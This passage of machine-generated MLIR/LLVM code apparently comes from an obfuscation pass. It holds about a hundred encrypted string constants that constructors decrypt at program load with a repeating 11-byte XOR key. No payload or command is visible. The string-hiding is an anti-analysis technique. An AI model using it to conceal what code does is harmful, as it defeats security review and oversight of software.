    %305 = llvm.call @f_61ae7c24(%303, %304) : (!llvm.ptr, i64) -> !llvm.ptr
    %306 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    %307 = llvm.mlir.constant(11 : i64) : i64
    %308 = llvm.call @f_61ae7c24(%306, %307) : (!llvm.ptr, i64) -> !llvm.ptr
    %309 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    %310 = llvm.mlir.constant(9 : i64) : i64
    %311 = llvm.call @f_61ae7c24(%309, %310) : (!llvm.ptr, i64) -> !llvm.ptr
    %312 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    %313 = llvm.mlir.constant(6 : i64) : i64
    %314 = llvm.call @f_61ae7c24(%312, %313) : (!llvm.ptr, i64) -> !llvm.ptr
    %315 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    %316 = llvm.mlir.constant(43 : i64) : i64
    %317 = llvm.call @f_61ae7c24(%315, %316) : (!llvm.ptr, i64) -> !llvm.ptr
    %318 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    %319 = llvm.mlir.constant(10 : i64) : i64
    %320 = llvm.call @f_61ae7c24(%318, %319) : (!llvm.ptr, i64) -> !llvm.ptr
    %321 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    %322 = llvm.mlir.constant(53 : i64) : i64
    %323 = llvm.call @f_61ae7c24(%321, %322) : (!llvm.ptr, i64) -> !llvm.ptr
    %324 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    %325 = llvm.mlir.constant(22 : i64) : i64
    %326 = llvm.call @f_61ae7c24(%324, %325) : (!llvm.ptr, i64) -> !llvm.ptr
    %327 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    %328 = llvm.mlir.constant(21 : i64) : i64
    %329 = llvm.call @f_61ae7c24(%327, %328) : (!llvm.ptr, i64) -> !llvm.ptr
    %330 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    %331 = llvm.mlir.constant(26 : i64) : i64
    %332 = llvm.call @f_61ae7c24(%330, %331) : (!llvm.ptr, i64) -> !llvm.ptr
    %333 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    %334 = llvm.mlir.constant(8 : i64) : i64
    %335 = llvm.call @f_61ae7c24(%333, %334) : (!llvm.ptr, i64) -> !llvm.ptr
    %336 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    %337 = llvm.mlir.constant(10 : i64) : i64
    %338 = llvm.call @f_61ae7c24(%336, %337) : (!llvm.ptr, i64) -> !llvm.ptr
    %339 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    %340 = llvm.mlir.constant(10 : i64) : i64
    %341 = llvm.call @f_61ae7c24(%339, %340) : (!llvm.ptr, i64) -> !llvm.ptr
    %342 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    %343 = llvm.mlir.constant(35 : i64) : i64
    %344 = llvm.call @f_61ae7c24(%342, %343) : (!llvm.ptr, i64) -> !llvm.ptr
    %345 = llvm.mlir.addressof @".str.115.enc" : !llvm.ptr
    %346 = llvm.mlir.constant(25 : i64) : i64
    %347 = llvm.call @f_61ae7c24(%345, %346) : (!llvm.ptr, i64) -> !llvm.ptr
    %348 = llvm.mlir.addressof @".str.116.enc" : !llvm.ptr
    %349 = llvm.mlir.constant(10 : i64) : i64
    %350 = llvm.call @f_61ae7c24(%348, %349) : (!llvm.ptr, i64) -> !llvm.ptr
    %351 = llvm.mlir.addressof @".str.117.enc" : !llvm.ptr
    %352 = llvm.mlir.constant(18 : i64) : i64
    %353 = llvm.call @f_61ae7c24(%351, %352) : (!llvm.ptr, i64) -> !llvm.ptr
    %354 = llvm.mlir.addressof @".str.118.enc" : !llvm.ptr
    %355 = llvm.mlir.constant(37 : i64) : i64
    %356 = llvm.call @f_61ae7c24(%354, %355) : (!llvm.ptr, i64) -> !llvm.ptr
    %357 = llvm.mlir.addressof @".str.119.enc" : !llvm.ptr
    %358 = llvm.mlir.constant(6 : i64) : i64
    %359 = llvm.call @f_61ae7c24(%357, %358) : (!llvm.ptr, i64) -> !llvm.ptr
    %360 = llvm.mlir.addressof @".str.120.enc" : !llvm.ptr
    %361 = llvm.mlir.constant(11 : i64) : i64
    %362 = llvm.call @f_61ae7c24(%360, %361) : (!llvm.ptr, i64) -> !llvm.ptr
    %363 = llvm.mlir.addressof @".str.121.enc" : !llvm.ptr
    %364 = llvm.mlir.constant(8 : i64) : i64
    %365 = llvm.call @f_61ae7c24(%363, %364) : (!llvm.ptr, i64) -> !llvm.ptr
    %366 = llvm.mlir.addressof @".str.122.enc" : !llvm.ptr
    %367 = llvm.mlir.constant(24 : i64) : i64
    %368 = llvm.call @f_61ae7c24(%366, %367) : (!llvm.ptr, i64) -> !llvm.ptr
    %369 = llvm.mlir.addressof @".str.123.enc" : !llvm.ptr
    %370 = llvm.mlir.constant(40 : i64) : i64
    %371 = llvm.call @f_61ae7c24(%369, %370) : (!llvm.ptr, i64) -> !llvm.ptr
    %372 = llvm.mlir.addressof @".str.124.enc" : !llvm.ptr
    %373 = llvm.mlir.constant(45 : i64) : i64
    %374 = llvm.call @f_61ae7c24(%372, %373) : (!llvm.ptr, i64) -> !llvm.ptr
    %375 = llvm.mlir.addressof @".str.125.enc" : !llvm.ptr
    %376 = llvm.mlir.constant(12 : i64) : i64
    %377 = llvm.call @f_61ae7c24(%375, %376) : (!llvm.ptr, i64) -> !llvm.ptr
    %378 = llvm.mlir.addressof @".str.126.enc" : !llvm.ptr
    %379 = llvm.mlir.constant(11 : i64) : i64
    %380 = llvm.call @f_61ae7c24(%378, %379) : (!llvm.ptr, i64) -> !llvm.ptr
    %381 = llvm.mlir.addressof @".str.127.enc" : !llvm.ptr
    %382 = llvm.mlir.constant(122 : i64) : i64
    %383 = llvm.call @f_61ae7c24(%381, %382) : (!llvm.ptr, i64) -> !llvm.ptr
    %384 = llvm.mlir.addressof @".str.128.enc" : !llvm.ptr
    %385 = llvm.mlir.constant(32 : i64) : i64
    %386 = llvm.call @f_61ae7c24(%384, %385) : (!llvm.ptr, i64) -> !llvm.ptr
    %387 = llvm.mlir.addressof @".str.129.enc" : !llvm.ptr
    %388 = llvm.mlir.constant(8 : i64) : i64
    %389 = llvm.call @f_61ae7c24(%387, %388) : (!llvm.ptr, i64) -> !llvm.ptr
    %390 = llvm.mlir.addressof @".str.130.enc" : !llvm.ptr
    %391 = llvm.mlir.constant(8 : i64) : i64
    %392 = llvm.call @f_61ae7c24(%390, %391) : (!llvm.ptr, i64) -> !llvm.ptr
    %393 = llvm.mlir.addressof @".str.131.enc" : !llvm.ptr
    %394 = llvm.mlir.constant(5 : i64) : i64
    %395 = llvm.call @f_61ae7c24(%393, %394) : (!llvm.ptr, i64) -> !llvm.ptr
    %396 = llvm.mlir.addressof @".str.132.enc" : !llvm.ptr
    %397 = llvm.mlir.constant(43 : i64) : i64
    %398 = llvm.call @f_61ae7c24(%396, %397) : (!llvm.ptr, i64) -> !llvm.ptr
    %399 = llvm.mlir.addressof @".str.133.enc" : !llvm.ptr
    %400 = llvm.mlir.constant(26 : i64) : i64
    %401 = llvm.call @f_61ae7c24(%399, %400) : (!llvm.ptr, i64) -> !llvm.ptr
    %402 = llvm.mlir.addressof @".str.134.enc" : !llvm.ptr
    %403 = llvm.mlir.constant(35 : i64) : i64
    %404 = llvm.call @f_61ae7c24(%402, %403) : (!llvm.ptr, i64) -> !llvm.ptr
    %405 = llvm.mlir.addressof @".str.135.enc" : !llvm.ptr
    %406 = llvm.mlir.constant(38 : i64) : i64
    %407 = llvm.call @f_61ae7c24(%405, %406) : (!llvm.ptr, i64) -> !llvm.ptr
    %408 = llvm.mlir.addressof @".str.136.enc" : !llvm.ptr
    %409 = llvm.mlir.constant(22 : i64) : i64
    %410 = llvm.call @f_61ae7c24(%408, %409) : (!llvm.ptr, i64) -> !llvm.ptr
    %411 = llvm.mlir.addressof @".str.137.enc" : !llvm.ptr
    %412 = llvm.mlir.constant(41 : i64) : i64
    %413 = llvm.call @f_61ae7c24(%411, %412) : (!llvm.ptr, i64) -> !llvm.ptr
    %414 = llvm.mlir.addressof @".str.138.enc" : !llvm.ptr
    %415 = llvm.mlir.constant(36 : i64) : i64
    %416 = llvm.call @f_61ae7c24(%414, %415) : (!llvm.ptr, i64) -> !llvm.ptr
    %417 = llvm.mlir.addressof @".str.139.enc" : !llvm.ptr
    %418 = llvm.mlir.constant(17 : i64) : i64
    %419 = llvm.call @f_61ae7c24(%417, %418) : (!llvm.ptr, i64) -> !llvm.ptr
    %420 = llvm.mlir.addressof @".str.140.enc" : !llvm.ptr
    %421 = llvm.mlir.constant(44 : i64) : i64
    %422 = llvm.call @f_61ae7c24(%420, %421) : (!llvm.ptr, i64) -> !llvm.ptr
    %423 = llvm.mlir.addressof @".str.141.enc" : !llvm.ptr
    %424 = llvm.mlir.constant(11 : i64) : i64
    %425 = llvm.call @f_61ae7c24(%423, %424) : (!llvm.ptr, i64) -> !llvm.ptr
    %426 = llvm.mlir.addressof @".str.142.enc" : !llvm.ptr
    %427 = llvm.mlir.constant(26 : i64) : i64
    %428 = llvm.call @f_61ae7c24(%426, %427) : (!llvm.ptr, i64) -> !llvm.ptr
    %429 = llvm.mlir.addressof @".str.143.enc" : !llvm.ptr
    %430 = llvm.mlir.constant(38 : i64) : i64
    %431 = llvm.call @f_61ae7c24(%429, %430) : (!llvm.ptr, i64) -> !llvm.ptr
    %432 = llvm.mlir.addressof @".str.144.enc" : !llvm.ptr
    %433 = llvm.mlir.constant(46 : i64) : i64
    %434 = llvm.call @f_61ae7c24(%432, %433) : (!llvm.ptr, i64) -> !llvm.ptr
    %435 = llvm.mlir.addressof @".str.145.enc" : !llvm.ptr
    %436 = llvm.mlir.constant(27 : i64) : i64
    %437 = llvm.call @f_61ae7c24(%435, %436) : (!llvm.ptr, i64) -> !llvm.ptr
    %438 = llvm.mlir.addressof @".str.146.enc" : !llvm.ptr
    %439 = llvm.mlir.constant(14 : i64) : i64
    %440 = llvm.call @f_61ae7c24(%438, %439) : (!llvm.ptr, i64) -> !llvm.ptr
    %441 = llvm.mlir.addressof @".str.147.enc" : !llvm.ptr
    %442 = llvm.mlir.constant(26 : i64) : i64
    %443 = llvm.call @f_61ae7c24(%441, %442) : (!llvm.ptr, i64) -> !llvm.ptr
    %444 = llvm.mlir.addressof @".str.148.enc" : !llvm.ptr
    %445 = llvm.mlir.constant(28 : i64) : i64
    %446 = llvm.call @f_61ae7c24(%444, %445) : (!llvm.ptr, i64) -> !llvm.ptr
    %447 = llvm.mlir.addressof @".str.149.enc" : !llvm.ptr
    %448 = llvm.mlir.constant(12 : i64) : i64
    %449 = llvm.call @f_61ae7c24(%447, %448) : (!llvm.ptr, i64) -> !llvm.ptr
    %450 = llvm.mlir.addressof @".str.150.enc" : !llvm.ptr
    %451 = llvm.mlir.constant(13 : i64) : i64
    %452 = llvm.call @f_61ae7c24(%450, %451) : (!llvm.ptr, i64) -> !llvm.ptr
    %453 = llvm.mlir.addressof @".str.151.enc" : !llvm.ptr
    %454 = llvm.mlir.constant(34 : i64) : i64
    %455 = llvm.call @f_61ae7c24(%453, %454) : (!llvm.ptr, i64) -> !llvm.ptr
    %456 = llvm.mlir.addressof @".str.152.enc" : !llvm.ptr
    %457 = llvm.mlir.constant(28 : i64) : i64
    %458 = llvm.call @f_61ae7c24(%456, %457) : (!llvm.ptr, i64) -> !llvm.ptr
    %459 = llvm.mlir.addressof @".str.153.enc" : !llvm.ptr
    %460 = llvm.mlir.constant(35 : i64) : i64
    %461 = llvm.call @f_61ae7c24(%459, %460) : (!llvm.ptr, i64) -> !llvm.ptr
    %462 = llvm.mlir.addressof @".str.154.enc" : !llvm.ptr
    %463 = llvm.mlir.constant(27 : i64) : i64
    %464 = llvm.call @f_61ae7c24(%462, %463) : (!llvm.ptr, i64) -> !llvm.ptr
    %465 = llvm.mlir.addressof @".str.155.enc" : !llvm.ptr
    %466 = llvm.mlir.constant(28 : i64) : i64
    %467 = llvm.call @f_61ae7c24(%465, %466) : (!llvm.ptr, i64) -> !llvm.ptr
    %468 = llvm.mlir.addressof @".str.156.enc" : !llvm.ptr
    %469 = llvm.mlir.constant(33 : i64) : i64
    %470 = llvm.call @f_61ae7c24(%468, %469) : (!llvm.ptr, i64) -> !llvm.ptr
    %471 = llvm.mlir.addressof @".str.157.enc" : !llvm.ptr
    %472 = llvm.mlir.constant(10 : i64) : i64
    %473 = llvm.call @f_61ae7c24(%471, %472) : (!llvm.ptr, i64) -> !llvm.ptr
    %474 = llvm.mlir.addressof @".str.158.enc" : !llvm.ptr
    %475 = llvm.mlir.constant(17 : i64) : i64
    %476 = llvm.call @f_61ae7c24(%474, %475) : (!llvm.ptr, i64) -> !llvm.ptr
    %477 = llvm.mlir.addressof @".str.159.enc" : !llvm.ptr
    %478 = llvm.mlir.constant(18 : i64) : i64
    %479 = llvm.call @f_61ae7c24(%477, %478) : (!llvm.ptr, i64) -> !llvm.ptr
    %480 = llvm.mlir.addressof @".str.160.enc" : !llvm.ptr
    %481 = llvm.mlir.constant(6 : i64) : i64
    %482 = llvm.call @f_61ae7c24(%480, %481) : (!llvm.ptr, i64) -> !llvm.ptr
    %483 = llvm.mlir.addressof @".str.161.enc" : !llvm.ptr
    %484 = llvm.mlir.constant(41 : i64) : i64
    %485 = llvm.call @f_61ae7c24(%483, %484) : (!llvm.ptr, i64) -> !llvm.ptr
    %486 = llvm.mlir.addressof @".str.162.enc" : !llvm.ptr
    %487 = llvm.mlir.constant(29 : i64) : i64
    %488 = llvm.call @f_61ae7c24(%486, %487) : (!llvm.ptr, i64) -> !llvm.ptr
    %489 = llvm.mlir.addressof @".str.163.enc" : !llvm.ptr
    %490 = llvm.mlir.constant(16 : i64) : i64
    %491 = llvm.call @f_61ae7c24(%489, %490) : (!llvm.ptr, i64) -> !llvm.ptr
    %492 = llvm.mlir.addressof @".str.164.enc" : !llvm.ptr
    %493 = llvm.mlir.constant(32 : i64) : i64
    %494 = llvm.call @f_61ae7c24(%492, %493) : (!llvm.ptr, i64) -> !llvm.ptr
    %495 = llvm.mlir.addressof @".str.165.enc" : !llvm.ptr
    %496 = llvm.mlir.constant(30 : i64) : i64
    %497 = llvm.call @f_61ae7c24(%495, %496) : (!llvm.ptr, i64) -> !llvm.ptr
    %498 = llvm.mlir.addressof @".str.166.enc" : !llvm.ptr
    %499 = llvm.mlir.constant(12 : i64) : i64
    %500 = llvm.call @f_61ae7c24(%498, %499) : (!llvm.ptr, i64) -> !llvm.ptr
    %501 = llvm.mlir.addressof @".str.167.enc" : !llvm.ptr
    %502 = llvm.mlir.constant(12 : i64) : i64
    %503 = llvm.call @f_61ae7c24(%501, %502) : (!llvm.ptr, i64) -> !llvm.ptr
    %504 = llvm.mlir.addressof @".str.168.enc" : !llvm.ptr
    %505 = llvm.mlir.constant(10 : i64) : i64
    %506 = llvm.call @f_61ae7c24(%504, %505) : (!llvm.ptr, i64) -> !llvm.ptr
    %507 = llvm.mlir.addressof @".str.169.enc" : !llvm.ptr
    %508 = llvm.mlir.constant(29 : i64) : i64
    %509 = llvm.call @f_61ae7c24(%507, %508) : (!llvm.ptr, i64) -> !llvm.ptr
    %510 = llvm.mlir.addressof @".str.170.enc" : !llvm.ptr
    %511 = llvm.mlir.constant(24 : i64) : i64
    %512 = llvm.call @f_61ae7c24(%510, %511) : (!llvm.ptr, i64) -> !llvm.ptr
    %513 = llvm.mlir.addressof @".str.171.enc" : !llvm.ptr
    %514 = llvm.mlir.constant(37 : i64) : i64
    %515 = llvm.call @f_61ae7c24(%513, %514) : (!llvm.ptr, i64) -> !llvm.ptr
    %516 = llvm.mlir.addressof @".str.172.enc" : !llvm.ptr
    %517 = llvm.mlir.constant(20 : i64) : i64
    %518 = llvm.call @f_61ae7c24(%516, %517) : (!llvm.ptr, i64) -> !llvm.ptr
    %519 = llvm.mlir.addressof @".str.173.enc" : !llvm.ptr
    %520 = llvm.mlir.constant(6 : i64) : i64
    %521 = llvm.call @f_61ae7c24(%519, %520) : (!llvm.ptr, i64) -> !llvm.ptr
    %522 = llvm.mlir.addressof @".str.174.enc" : !llvm.ptr
    %523 = llvm.mlir.constant(16 : i64) : i64
    %524 = llvm.call @f_61ae7c24(%522, %523) : (!llvm.ptr, i64) -> !llvm.ptr
    %525 = llvm.mlir.addressof @".str.175.enc" : !llvm.ptr
    %526 = llvm.mlir.constant(9 : i64) : i64
    %527 = llvm.call @f_61ae7c24(%525, %526) : (!llvm.ptr, i64) -> !llvm.ptr
    %528 = llvm.mlir.addressof @".str.176.enc" : !llvm.ptr
    %529 = llvm.mlir.constant(41 : i64) : i64
    %530 = llvm.call @f_61ae7c24(%528, %529) : (!llvm.ptr, i64) -> !llvm.ptr
    %531 = llvm.mlir.addressof @".str.177.enc" : !llvm.ptr
    %532 = llvm.mlir.constant(81 : i64) : i64
    %533 = llvm.call @f_61ae7c24(%531, %532) : (!llvm.ptr, i64) -> !llvm.ptr
    %534 = llvm.mlir.addressof @".str.178.enc" : !llvm.ptr
    %535 = llvm.mlir.constant(45 : i64) : i64
    %536 = llvm.call @f_61ae7c24(%534, %535) : (!llvm.ptr, i64) -> !llvm.ptr
    %537 = llvm.mlir.addressof @".str.179.enc" : !llvm.ptr
    %538 = llvm.mlir.constant(9 : i64) : i64
    %539 = llvm.call @f_61ae7c24(%537, %538) : (!llvm.ptr, i64) -> !llvm.ptr
    %540 = llvm.mlir.addressof @".str.180.enc" : !llvm.ptr
    %541 = llvm.mlir.constant(28 : i64) : i64
    %542 = llvm.call @f_61ae7c24(%540, %541) : (!llvm.ptr, i64) -> !llvm.ptr
    %543 = llvm.mlir.addressof @".str.181.enc" : !llvm.ptr
    %544 = llvm.mlir.constant(25 : i64) : i64
    %545 = llvm.call @f_61ae7c24(%543, %544) : (!llvm.ptr, i64) -> !llvm.ptr
    %546 = llvm.mlir.addressof @".str.182.enc" : !llvm.ptr
    %547 = llvm.mlir.constant(19 : i64) : i64
    %548 = llvm.call @f_61ae7c24(%546, %547) : (!llvm.ptr, i64) -> !llvm.ptr
    %549 = llvm.mlir.addressof @".str.183.enc" : !llvm.ptr
    %550 = llvm.mlir.constant(39 : i64) : i64
    %551 = llvm.call @f_61ae7c24(%549, %550) : (!llvm.ptr, i64) -> !llvm.ptr
    %552 = llvm.mlir.addressof @".str.184.enc" : !llvm.ptr
    %553 = llvm.mlir.constant(38 : i64) : i64
    %554 = llvm.call @f_61ae7c24(%552, %553) : (!llvm.ptr, i64) -> !llvm.ptr
    %555 = llvm.mlir.addressof @".str.185.enc" : !llvm.ptr
    %556 = llvm.mlir.constant(14 : i64) : i64
    %557 = llvm.call @f_61ae7c24(%555, %556) : (!llvm.ptr, i64) -> !llvm.ptr
    %558 = llvm.mlir.addressof @".str.186.enc" : !llvm.ptr
    %559 = llvm.mlir.constant(35 : i64) : i64
    %560 = llvm.call @f_61ae7c24(%558, %559) : (!llvm.ptr, i64) -> !llvm.ptr
    %561 = llvm.mlir.addressof @".str.187.enc" : !llvm.ptr
    %562 = llvm.mlir.constant(40 : i64) : i64
    %563 = llvm.call @f_61ae7c24(%561, %562) : (!llvm.ptr, i64) -> !llvm.ptr
    %564 = llvm.mlir.addressof @".str.188.enc" : !llvm.ptr
    %565 = llvm.mlir.constant(35 : i64) : i64
    %566 = llvm.call @f_61ae7c24(%564, %565) : (!llvm.ptr, i64) -> !llvm.ptr
    %567 = llvm.mlir.addressof @".str.189.enc" : !llvm.ptr
    %568 = llvm.mlir.constant(35 : i64) : i64
    %569 = llvm.call @f_61ae7c24(%567, %568) : (!llvm.ptr, i64) -> !llvm.ptr
    %570 = llvm.mlir.addressof @".str.190.enc" : !llvm.ptr
    %571 = llvm.mlir.constant(39 : i64) : i64
    %572 = llvm.call @f_61ae7c24(%570, %571) : (!llvm.ptr, i64) -> !llvm.ptr
    %573 = llvm.mlir.addressof @".str.191.enc" : !llvm.ptr
    %574 = llvm.mlir.constant(56 : i64) : i64
    %575 = llvm.call @f_61ae7c24(%573, %574) : (!llvm.ptr, i64) -> !llvm.ptr
    %576 = llvm.mlir.addressof @".str.192.enc" : !llvm.ptr
    %577 = llvm.mlir.constant(51 : i64) : i64
    %578 = llvm.call @f_61ae7c24(%576, %577) : (!llvm.ptr, i64) -> !llvm.ptr
    %579 = llvm.mlir.addressof @".str.193.enc" : !llvm.ptr
    %580 = llvm.mlir.constant(47 : i64) : i64
    %581 = llvm.call @f_61ae7c24(%579, %580) : (!llvm.ptr, i64) -> !llvm.ptr
    %582 = llvm.mlir.addressof @".str.194.enc" : !llvm.ptr
    %583 = llvm.mlir.constant(77 : i64) : i64
    %584 = llvm.call @f_61ae7c24(%582, %583) : (!llvm.ptr, i64) -> !llvm.ptr
    %585 = llvm.mlir.addressof @".str.195.enc" : !llvm.ptr
    %586 = llvm.mlir.constant(53 : i64) : i64
    %587 = llvm.call @f_61ae7c24(%585, %586) : (!llvm.ptr, i64) -> !llvm.ptr
    %588 = llvm.mlir.addressof @".str.196.enc" : !llvm.ptr
    %589 = llvm.mlir.constant(33 : i64) : i64
    %590 = llvm.call @f_61ae7c24(%588, %589) : (!llvm.ptr, i64) -> !llvm.ptr
    %591 = llvm.mlir.addressof @".str.197.enc" : !llvm.ptr
    %592 = llvm.mlir.constant(34 : i64) : i64
    %593 = llvm.call @f_61ae7c24(%591, %592) : (!llvm.ptr, i64) -> !llvm.ptr
    llvm.return
  }
  llvm.mlir.global_ctors ctors = [@f_95bd4817, @f_e836b4e8], priorities = [101 : i32, 101 : i32], data = [#llvm.zero, #llvm.zero]
  llvm.func internal @f_b7bfea9b(%arg0: !llvm.ptr, %arg1: i32) attributes {no_inline} {
    %0 = llvm.mlir.addressof @__obfs_key : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(1 : i32) : i32
    %3 = llvm.mlir.constant(11 : i32) : i32
    %4 = llvm.alloca %2 x i32 : (i32) -> !llvm.ptr
    llvm.store %1, %4 : i32, !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb2
    %5 = llvm.load %4 : !llvm.ptr -> i32
    %6 = llvm.icmp "slt" %5, %arg1 : i32
    llvm.cond_br %6, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %7 = llvm.load %4 : !llvm.ptr -> i32
    %8 = llvm.sext %7 : i32 to i64
    %9 = llvm.getelementptr %arg0[%8] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %10 = llvm.load %9 : !llvm.ptr -> i8
    %11 = llvm.srem %7, %3 : i32
    %12 = llvm.sext %11 : i32 to i64
    %13 = llvm.getelementptr %0[%12] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %14 = llvm.load %13 : !llvm.ptr -> i8
    %15 = llvm.xor %10, %14 : i8
    llvm.store %15, %9 : i8, !llvm.ptr
    %16 = llvm.add %7, %2 : i32
    llvm.store %16, %4 : i32, !llvm.ptr
    llvm.br ^bb1
  ^bb3:  // pred: ^bb1
    llvm.return
  }
  llvm.func internal @f_e836b4e8() attributes {no_inline} {
    %0 = llvm.mlir.constant(45 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%1, %0) : (!llvm.ptr, i32) -> ()
    %2 = llvm.mlir.constant(16 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%3, %2) : (!llvm.ptr, i32) -> ()
    %4 = llvm.mlir.constant(37 : i32) : i32
    %5 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%5, %4) : (!llvm.ptr, i32) -> ()
    %6 = llvm.mlir.constant(37 : i32) : i32
    %7 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%7, %6) : (!llvm.ptr, i32) -> ()
    %8 = llvm.mlir.constant(47 : i32) : i32
    %9 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%9, %8) : (!llvm.ptr, i32) -> ()
    %10 = llvm.mlir.constant(39 : i32) : i32
    %11 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%11, %10) : (!llvm.ptr, i32) -> ()
    %12 = llvm.mlir.constant(8 : i32) : i32
    %13 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%13, %12) : (!llvm.ptr, i32) -> ()
    %14 = llvm.mlir.constant(11 : i32) : i32
    %15 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%15, %14) : (!llvm.ptr, i32) -> ()
    %16 = llvm.mlir.constant(12 : i32) : i32
    %17 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%17, %16) : (!llvm.ptr, i32) -> ()
    %18 = llvm.mlir.constant(6 : i32) : i32
    %19 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%19, %18) : (!llvm.ptr, i32) -> ()
    %20 = llvm.mlir.constant(28 : i32) : i32
    %21 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%21, %20) : (!llvm.ptr, i32) -> ()
    %22 = llvm.mlir.constant(37 : i32) : i32
    %23 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%23, %22) : (!llvm.ptr, i32) -> ()
    %24 = llvm.mlir.constant(45 : i32) : i32
    %25 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%25, %24) : (!llvm.ptr, i32) -> ()
    %26 = llvm.mlir.constant(21 : i32) : i32
    %27 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%27, %26) : (!llvm.ptr, i32) -> ()
    %28 = llvm.mlir.constant(4 : i32) : i32
    %29 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%29, %28) : (!llvm.ptr, i32) -> ()
    %30 = llvm.mlir.constant(2 : i32) : i32
    %31 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%31, %30) : (!llvm.ptr, i32) -> ()
    %32 = llvm.mlir.constant(3 : i32) : i32
    %33 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%33, %32) : (!llvm.ptr, i32) -> ()
    %34 = llvm.mlir.constant(28 : i32) : i32
    %35 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%35, %34) : (!llvm.ptr, i32) -> ()
    %36 = llvm.mlir.constant(19 : i32) : i32
    %37 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%37, %36) : (!llvm.ptr, i32) -> ()
    %38 = llvm.mlir.constant(25 : i32) : i32
    %39 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%39, %38) : (!llvm.ptr, i32) -> ()
    %40 = llvm.mlir.constant(52 : i32) : i32
    %41 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%41, %40) : (!llvm.ptr, i32) -> ()
    %42 = llvm.mlir.constant(12 : i32) : i32
    %43 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%43, %42) : (!llvm.ptr, i32) -> ()
    %44 = llvm.mlir.constant(14 : i32) : i32
    %45 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%45, %44) : (!llvm.ptr, i32) -> ()
    %46 = llvm.mlir.constant(34 : i32) : i32
    %47 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%47, %46) : (!llvm.ptr, i32) -> ()
    %48 = llvm.mlir.constant(50 : i32) : i32
    %49 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%49, %48) : (!llvm.ptr, i32) -> ()
    %50 = llvm.mlir.constant(12 : i32) : i32
    %51 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%51, %50) : (!llvm.ptr, i32) -> ()
    %52 = llvm.mlir.constant(13 : i32) : i32
    %53 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%53, %52) : (!llvm.ptr, i32) -> ()
    %54 = llvm.mlir.constant(7 : i32) : i32
    %55 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%55, %54) : (!llvm.ptr, i32) -> ()
    %56 = llvm.mlir.constant(45 : i32) : i32
    %57 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%57, %56) : (!llvm.ptr, i32) -> ()
    %58 = llvm.mlir.constant(13 : i32) : i32
    %59 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%59, %58) : (!llvm.ptr, i32) -> ()
    %60 = llvm.mlir.constant(26 : i32) : i32
    %61 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%61, %60) : (!llvm.ptr, i32) -> ()
    %62 = llvm.mlir.constant(18 : i32) : i32
    %63 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    llvm.call @f_b7bfea9b(%63, %62) : (!llvm.ptr, i32) -> ()
    %64 = llvm.mlir.constant(58 : i32) : i32
